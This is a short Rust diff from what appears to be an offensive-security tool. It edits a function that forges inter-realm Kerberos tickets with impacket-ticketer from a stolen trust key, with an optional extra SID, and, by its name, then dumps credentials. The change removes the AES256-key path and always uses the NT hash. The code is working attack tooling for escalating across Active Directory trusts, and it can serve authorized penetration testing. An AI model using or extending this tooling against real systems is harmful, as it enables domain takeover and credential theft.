@@ -359,10 +359,6 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         .to_string();
     let extra_sid = optional_str(args, "extra_sid");
     let dc_ip = optional_str(args, "dc_ip");
-    // AES256 trust key — required by Win2016+ target KDCs. When absent (older
-    // secretsdump dumps that captured NTLM only), fall back to -nthash and
-    // accept a silent rejection risk on the target side.
-    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
 
     let nt = credentials::nt_hash_only(trust_key);
 
@@ -371,16 +367,9 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
 
     let krbtgt_spn = format!("krbtgt/{target_domain}");
     let mut ticketer = CommandBuilder::new("impacket-ticketer")
+        .flag("-nthash", nt)
         .flag("-domain-sid", source_sid)
         .flag("-domain", source_domain);
-    // impacket-ticketer rejects both -nthash and -aesKey together ("Pick only
-    // one"). Prefer AES256 when available so Win2016+ target DCs accept the
-    // ticket; fall back to NT hash otherwise.
-    if let Some(aes) = aes_key {
-        ticketer = ticketer.flag("-aesKey", aes);
-    } else {
-        ticketer = ticketer.flag("-nthash", nt);
-    }
     if let Some(es) = extra_sid {
         ticketer = ticketer.flag("-extra-sid", es);
     }
